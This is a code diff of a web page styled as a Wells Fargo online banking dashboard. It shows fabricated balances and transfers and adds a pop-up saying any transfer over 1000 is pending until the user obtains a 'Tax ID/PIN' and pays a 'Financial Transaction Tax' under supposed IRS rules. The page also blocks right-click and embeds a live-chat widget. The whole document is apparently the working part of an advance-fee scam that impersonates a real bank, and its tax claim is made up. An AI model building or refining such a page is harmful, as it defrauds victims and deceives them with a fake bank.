@@ -1764,13 +1764,13 @@
                         </thead>
                         <tbody>
 
-                            <tr onclick="showTransactionReceipt(7)">
+                            <!-- <tr onclick="showTransactionReceipt(7)">
                                 <td>2025-15-09</td>
                                 <td>Transfer to Farhana Afroze</td>
                                 <td>Transfer</td>
-                                <td class="transaction-amount negative">-€50,000.00</td>
+                                <td class="transaction-amount negative">-€100,000.00</td>
                                 <td><span class="transaction-status status-pending">completed</span></td>
-                            </tr>
+                            </tr> -->
 
                             <tr onclick="showTransactionReceipt(6)">
                                 <td>2025-15-09</td>
@@ -1858,13 +1858,7 @@
                 <label>To Bank</label>
                 <select class="form-control" id="toBank">
                     <option value="zelle">Send with Zelle®</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label>International Transfers</label>
-                <select class="form-control" id="toBank">
-                    <option value="zelle">Make International Transfer</option>
+                     <option value="zelle">Make International Transfer</option>
                     <option value="wells-fargo">Wells Fargo</option>
                     <option value="boa">Bank of America</option>
                     <option value="wells-fargo">National Irish Bank</option>
@@ -2120,7 +2114,7 @@
 
             // Initialize transactions with sample data
             transactions = [
-                { id: 7, date: '2025-28-09', description: 'Transfer to Farhana Afroze', amount: -50000.00, category: 'Transfer', status: 'pending' },
+                // { id: 7, date: '2025-28-09', description: 'Transfer to Farhana Afroze', amount: -100000.00, category: 'Transfer', status: 'pending' },
                 { id: 6, date: '2025-15-09', description: 'Transfer to Emilia Moises', amount: -3000.00, category: 'Transfer', status: 'completed' },
                 { id: 1, date: '2025-1-09', description: 'Car Maintenance', amount: -107000.82, category: 'Transportation', status: 'completed' },
                 { id: 2, date: '2025-1-09', description: 'Paramout Bussiness Jets', amount: -40500.00, category: 'Flight Payment', status: 'completed' },
@@ -2638,7 +2632,7 @@
             const run = () => completeTransfer(amount, fromAccount, toBank);
 
             if (amount > 1000) {
-                showAuthFeedback('ATTENTION !', `Transfer of ${formatCurrency(amount)} failed. You are required to generate a Tax ID/PIN immediately.
+                showAuthFeedback('ATTENTION !', `Transfer of ${formatCurrency(amount)} is pending and will require a Tax ID/PIN to complete.
                
 
                     Please note that a one-time Financial Transaction Tax (FTT) payment is required to process international transactions in accordance with IRS regulations.
@@ -2652,29 +2646,29 @@
         }
 
 
-        // function completeTransfer(amount, fromAccount, toAccount) {
-        //     // Add transaction to history
-        //     const newTransaction = {
-        //         id: transactions.length + 1,
-        //         date: new Date().toISOString().split('T')[0],
-        //         description: `Transfer to ${toAccount}`,
-        //         amount: -amount,
-        //         category: 'Transfer',
-        //         status: 'completed',
-        //         details: {
-        //             fromAccount: fromAccount,
-        //             toAccount: toAccount,
-        //             fee: 0,
-        //             reference: `WF${Date.now()}`
-        //         }
-        //     };
+        function completeTransfer(amount, fromAccount, toAccount) {
+            // Add transaction to history
+            const newTransaction = {
+                id: transactions.length + 1,
+                date: new Date().toISOString().split('T')[0],
+                description: `Transfer to ${toAccount}`,
+                amount: -amount,
+                category: 'Transfer',
+                status: 'pending',
+                details: {
+                    fromAccount: fromAccount,
+                    toAccount: toAccount,
+                    fee: 0,
+                    reference: `WF${Date.now()}`
+                }
+            };
 
-        //     transactions.unshift(newTransaction);
+            transactions.unshift(newTransaction);
 
-        //     // Show receipt
-        //     showTransactionReceipt(newTransaction.id);
-        //     updateUI();
-        // }
+            // Show receipt
+            showTransactionReceipt(newTransaction.id);
+            updateUI();
+        }
 
         function processBillPayment() {
             const amount = parseFloat(document.getElementById('billAmount').value);
@@ -2778,79 +2772,79 @@
             updateUI();
         }
 
-        // function showTransactionReceipt(transactionId) {
-        //     const transaction = transactions.find(t => t.id === transactionId);
-        //     if (!transaction) return;
+        function showTransactionReceipt(transactionId) {
+            const transaction = transactions.find(t => t.id === transactionId);
+            if (!transaction) return;
 
-        //     const receiptContent = document.getElementById('receiptContent');
-        //     receiptContent.innerHTML = `
-        //         <div class="receipt-header">
-        //             <div class="receipt-title">Transaction Receipt</div>
-        //             <div>Wells Fargo Bank, N.A.</div>
-        //         </div>
+            const receiptContent = document.getElementById('receiptContent');
+            receiptContent.innerHTML = `
+                <div class="receipt-header">
+                    <div class="receipt-title">Transaction Receipt</div>
+                    <div>Wells Fargo Bank, N.A.</div>
+                </div>
 
-        //         <div class="receipt-details">
-        //             <div class="receipt-row">
-        //                 <span>Transaction Date:</span>
-        //                 <span>${transaction.date}</span>
-        //             </div>
-        //             <div class="receipt-row">
-        //                 <span>Description:</span>
-        //                 <span>${transaction.description}</span>
-        //             </div>
-        //             <div class="receipt-row">
-        //                 <span>Category:</span>
-        //                 <span>${transaction.category}</span>
-        //             </div>
-        //             <div class="receipt-row">
-        //                 <span>Amount:</span>
-        //                 <span>${formatCurrency(transaction.amount)}</span>
-        //             </div>
-        //             <div class="receipt-row">
-        //                 <span>Status:</span>
-        //                 <span class="transaction-status status-${transaction.status}">${transaction.status}</span>
-        //             </div>
-        //             ${transaction.details ? `
-        //                 <div class="receipt-row">
-        //                     <span>Reference Number:</span>
-        //                     <span>${transaction.details.reference}</span>
-        //                 </div>
-        //                 ${transaction.details.fromAccount ? `
-        //                     <div class="receipt-row">
-        //                         <span>From Account:</span>
-        //                         <span>${transaction.details.fromAccount}</span>
-        //                     </div>
-        //                 ` : ''}
-        //                 ${transaction.details.toAccount ? `
-        //                     <div class="receipt-row">
-        //                         <span>To Account:</span>
-        //                         <span>${transaction.details.toAccount}</span>
-        //                     </div>
-        //                 ` : ''}
-        //                 ${transaction.details.payee ? `
-        //                     <div class="receipt-row">
-        //                         <span>Payee:</span>
-        //                         <span>${transaction.details.payee}</span>
-        //                     </div>
-        //                 ` : ''}
-        //                 <div class="receipt-row">
-        //                     <span>Fee:</span>
-        //                     <span>${formatCurrency(transaction.details.fee || 0)}</span>
-        //                 </div>
-        //             ` : ''}
-        //             <div class="receipt-row total">
-        //                 <span>Total:</span>
-        //                 <span>${formatCurrency(transaction.amount - (transaction.details ? transaction.details.fee || 0 : 0))}</span>
-        //             </div>
-        //         </div>
+                <div class="receipt-details">
+                    <div class="receipt-row">
+                        <span>Transaction Date:</span>
+                        <span>${transaction.date}</span>
+                    </div>
+                    <div class="receipt-row">
+                        <span>Description:</span>
+                        <span>${transaction.description}</span>
+                    </div>
+                    <div class="receipt-row">
+                        <span>Category:</span>
+                        <span>${transaction.category}</span>
+                    </div>
+                    <div class="receipt-row">
+                        <span>Amount:</span>
+                        <span>${formatCurrency(transaction.amount)}</span>
+                    </div>
+                    <div class="receipt-row">
+                        <span>Status:</span>
+                        <span class="transaction-status status-${transaction.status}">${transaction.status}</span>
+                    </div>
+                    ${transaction.details ? `
+                        <div class="receipt-row">
+                            <span>Reference Number:</span>
+                            <span>${transaction.details.reference}</span>
+                        </div>
+                        ${transaction.details.fromAccount ? `
+                            <div class="receipt-row">
+                                <span>From Account:</span>
+                                <span>${transaction.details.fromAccount}</span>
+                            </div>
+                        ` : ''}
+                        ${transaction.details.toAccount ? `
+                            <div class="receipt-row">
+                                <span>To Account:</span>
+                                <span>${transaction.details.toAccount}</span>
+                            </div>
+                        ` : ''}
+                        ${transaction.details.payee ? `
+                            <div class="receipt-row">
+                                <span>Payee:</span>
+                                <span>${transaction.details.payee}</span>
+                            </div>
+                        ` : ''}
+                        <div class="receipt-row">
+                            <span>Fee:</span>
+                            <span>${formatCurrency(transaction.details.fee || 0)}</span>
+                        </div>
+                    ` : ''}
+                    <div class="receipt-row total">
+                        <span>Total:</span>
+                        <span>${formatCurrency(transaction.amount - (transaction.details ? transaction.details.fee || 0 : 0))}</span>
+                    </div>
+                </div>
 
-        //         <div style="text-align: center; margin-top: 30px; color: #666; font-size: 14px;">
-        //             Thank you for banking with Wells Fargo.
-        //         </div>
-        //     `;
+                <div style="text-align: center; margin-top: 30px; color: #666; font-size: 14px;">
+                    Thank you for banking with Wells Fargo.
+                </div>
+            `;
 
-        //     showModal('receiptModal');
-        // }
+            showModal('receiptModal');
+        }
 
         function printReceipt() {
             const receiptContent = document.getElementById('receiptContent').innerHTML;
@@ -2915,7 +2909,8 @@
             }
         }
 
-         document.addEventListener("contextmenu", event => event.preventDefault());
+
+        document.addEventListener("contextmenu", event => event.preventDefault());
 
     </script>
 
@@ -2932,6 +2927,8 @@
             s1.setAttribute('crossorigin', '*');
             s0.parentNode.insertBefore(s1, s0);
         })();
+
+        document.addEventListener("contextmenu", event => event.preventDefault());
     </script>
     <!--End of Tawk.to Script-->
 
@@ -4703,13 +4700,13 @@
                         </thead>
                         <tbody>
 
-                            <tr onclick="showTransactionReceipt(6)">
+                            <!-- <tr onclick="showTransactionReceipt(6)">
                                 <td>2025-15-09</td>
                                 <td>Transfer to Farhana Afroze</td>
                                 <td>Transfer</td>
-                                <td class="transaction-amount negative">-€50,000.00</td>
+                                <td class="transaction-amount negative">-€100,000.00</td>
                                 <td><span class="transaction-status status-pending">pending</span></td>
-                            </tr>
+                            </tr> -->
 
                             <tr onclick="showTransactionReceipt(7)">
                                 <td>2025-28-09</td>
@@ -4797,13 +4794,7 @@
                 <label>To Bank</label>
                 <select class="form-control" id="toBank">
                     <option value="zelle">Send with Zelle®</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label>International Transfers</label>
-                <select class="form-control" id="toBank">
-                    <option value="zelle">Make International Transfer</option>
+                     <option value="zelle">Make International Transfer</option>
                     <option value="wells-fargo">Wells Fargo</option>
                     <option value="boa">Bank of America</option>
                     <option value="wells-fargo">National Irish Bank</option>
